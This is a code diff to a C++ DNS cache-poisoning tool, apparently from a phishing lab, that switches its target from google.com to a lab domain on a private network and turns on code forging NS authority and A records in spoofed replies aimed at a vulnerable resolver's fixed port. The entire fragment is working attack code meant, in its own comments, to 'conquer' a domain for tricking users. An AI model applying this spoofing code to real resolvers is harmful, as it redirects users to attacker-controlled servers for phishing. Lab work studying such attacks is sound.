@@ -15,15 +15,16 @@ std::string targetip = "192.168.0.130";
 // Vulnerable DNS Server
 std::string targetdns = "192.168.0.129";
 // Authoritative upper level one
-std::string authoritativedns = "216.239.32.10";
+// std::string authoritativedns = "216.239.32.10";
+std::string authoritativedns = "192.168.0.135";
 // sarcastic section of the subdomain
 std::string sarcastic = "";
 // base domain for generating sarcastic subdomains
-std::string basedomain = "google.com";
+std::string basedomain = "dnsphishinglab.com";
 // domain which will be conquered for tricking user
-std::string claimeddomain = "www.google.com";
+std::string claimeddomain = "www.dnsphishinglab.com";
 // Authoritative upper level one
-std::string spoofeddns = "ns1.google.com";
+std::string spoofeddns = "ns.dnsphishinglab.com";
 // port that is static in vulnerable dns
 uint32_t attackport = 55555;
 
@@ -116,19 +117,19 @@ bool build_believable_responses(std::string sarcasm, std::string author_dns, std
 
 		//build authoritative record field
 
-		// DNS::Resource authority_field;
-		// authority_field.dname(basedomain);
-		// authority_field.ttl(ttl_val);
-		// authority_field.type(DNS::NS);
-		// authority_field.query_class(DNS::IN);
-		// authority_field.data(spoof_dns);
+		DNS::Resource authority_field;
+		authority_field.dname(basedomain);
+		authority_field.ttl(ttl_val);
+		authority_field.type(DNS::NS);
+		authority_field.query_class(DNS::IN);
+		authority_field.data(spoof_dns);
 
-		// resp_pkt.rfind_pdu<DNS>().add_authority( authority_field );
+		resp_pkt.rfind_pdu<DNS>().add_authority( authority_field );
 
 
 		// Additional field
 		DNS::Resource faker_field;
-		faker_field.dname(claim_domain);
+		faker_field.dname(spoof_dns);
 		faker_field.ttl(ttl_val);
 		faker_field.type(DNS::A);
 		faker_field.query_class(DNS::IN);
